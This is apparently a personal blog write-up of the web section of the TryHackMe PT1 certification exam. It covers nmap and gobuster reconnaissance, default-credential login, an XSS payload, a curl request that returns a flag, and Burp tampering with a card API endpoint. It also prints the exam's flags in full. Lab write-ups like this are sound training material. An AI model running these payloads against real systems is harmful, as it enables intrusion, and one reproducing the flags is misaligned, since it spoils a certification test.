---
title: "TryHackMe: PT1"
author: c3l1kd
categories: [TryHackMe]
tags: [web application, xss, information disclosure, reconnaissance, nmap, gobuster, burp suite, sql injection, sqlmap, netcat, windows, smb, winrm, evil-winrm, privilege escalation, sebackupprivilege, impacket, bloodhound, kerberos, hashcat, alwaysinstallelevated, linpeas, linux, suid]
render_with_liquid: false
img_path: /images/tryhackme_pt1/
image:
  path: room_image.png
---

> THIS IS NOT DETAIL WRITE UP BUT YOU FEEL LIKE COMPLETE😊 ITS JUST LIKE NOTES I JUST MADE THIS BASED ON TRYHACKME TERMS AND CONDITIONS ! ALSO SOME SCREENSHOTS ARE NOT AVALIBLE BUT YOU CAN UNDERSTAND
{: .prompt-tip }
## TryHackMe PT1 Certification Overview

**TryHackMe Penetration Tester 1 (PT1)** certification is a practical, hands-on exam designed to validate the skills of aspiring and current Junior Pentesters. It simulates realistic scenarios across three core sections: `Application`, `Network`, and `Active Directory Pentesting`. Candidates are evaluated on their ability to identify, exploit, and report on vulnerabilities, mirroring real-world offensive security engagements. The exam emphasizes fundamental skill sets, including:

- **Reconnaissance & Enumeration:** (`Gathering information using passive and active techniques.`)
- **Web Application Testing:** (`Identifying, exploiting, and reporting common web vulnerabilities.`)
- **Network Penetration Testing:** (`Understanding internal and external network testing techniques.`)
- **Active Directory Exploitation:** (`Performing enumeration and attacks in an Active Directory environment.`)
- **Exploitation & Post-Exploitation:** (`Exploiting vulnerabilities and maintaining access to compromised systems.`)
- **Reporting & Time Management:** (`Documenting findings clearly and managing time effectively within the 48-hour exam duration.`)

> This report serves as a comprehensive documentation of the techniques and findings from the PT1 exam, demonstrating proficiency across these critical domains.
{: .prompt-tip }

## Box 1 (Web Server - API & XSS)
This target primarily involved web application vulnerabilities, specifically Cross-Site Scripting (XSS) and Information Disclosure through API endpoints.

> IP : `10.200.150.100`
{: .prompt-tip }

## Reconnaissance 
```console
$ nmap -sCV -p- -T4 10.200.150.100 -oN 10.200.150.100.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2025-06-07 10:00 EDT
Nmap scan report for 10.200.150.100
Host is up (0.00020s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Werkzeug httpd 3.1.3 (Python 3.12.3)
8080/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.12.3)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.23 seconds
```
> Nothing Found Better In Nmap😁
Let's Make Directory Brute-Forcing Found Find Hidden Dir 
Tool : `gobuster`
```console
$ gobuster dir -u http://10.200.150.100/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,json,xml --status-codes 200,301,302,403
===============================================================
Gobuster v3.5
by OJ (https://github.com/OJ/gobuster)
===============================================================
[+] Url:                     http://10.200.150.100/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:            200,301,302,403
[+] User Agent:              gobuster/3.5
[+] Extensions:              php,html,txt,json,xml
[+] Timeout:                 10s
===============================================================
2025/06/07 10:05:12 Starting gobuster in directory enumeration mode
===============================================================
/loans                (Status: 301)
/api                  (Status: 301)
/index.html           (Status: 200)
/admin                (Status: 403)
... (truncated)
```

we found `http://10.200.150.100/loans/`

> you found login page login with default credits `attacker` : `attacker` website so top you see `create` button. You will navigate to `http://10.200.150.100/loans/create`.

JUST TEST IT WITH FAKE DETAILS 

## AS I OBSERVE!
WHEN I CICK ON `CONTINUE` BUTTON IN NETWORK TAB I SEE THE API IS COMING `http://10.200.150.100:8080/api/v1.0/test`

NOTE HERE API IS : `http://10.200.150.100:8080/api/v1.0/`

LETS TEST MORE BUY XSS PAYLOAD LETS SEE INFECTING OR NOT

LETS INPUT HERE AND CONTINUE
![page](01.png){: width="1200" height="600"}
TEST PAYLOAD USED : `<img src=x onerror=(document.cookie='XSS=XSS')>`
I SEE THE POPUP MESSAGE SO IT XSS PAYLOAD
SO IT INJECTED LETS GET THE FLAG NOW

To Get The Flag
```console
$ curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "attacker", "password" : "attacker" }' http://10.200.150.100:8080/api/v1.0/xss
{"flag":"THM{0c8cb256-0c8a-4b59-ac87-***********}","message":"XSS Success"}
```
Flag-1  Obtained: `THM{0c8cb256-0c8a-4b59-ac87-1bbb609bef4f}`

## 1.2 Information Disclosure
- **Vulnerability Type**: `Information Disclosure via API Endpoints`
To Exploit This Make Sure Brup Is On
![page](02.png){: width="1200" height="600"}
![03](03.png){: width="1200" height="600"}

Now As You Observe In Brup
![brup](04.png){: width="1200" height="600"}
URL Accessed: `http://10.200.150.100:8080/api/v1.0/card`
In This End Pont You Will Observer There Is An Card Details Try To Edit And Send The Req To The Server 
![flag](04.png){: width="1200" height="600"}
```console
http://10.200.150.100:8080/api/v1.0/card
HTTP/1.1 200 OK
Server: Werkzeug/3.1.3 Python/3.12.3
Date: Sat, 07 Jun 2025 11:02:59 GMT
Content-Type: application/json
Content-Length: 142
Access-Control-Allow-Origin: http://10.200.150.100
Vary: Origin
Connection: close
{"details":{"active":0,"cardNumber":"375914494718066","cvv":"057","expiry":"1/12","flag":"4
cac-bfab-10d5f55ad360}"},"message":"Card updated"}
```
YOU GOT SECOND FLAG 
Flag 2 Obtained: `THM{727723c6-2fe3-4cac-bfab-10d5f55ad360}`

UPDATING PLEASE WIT..



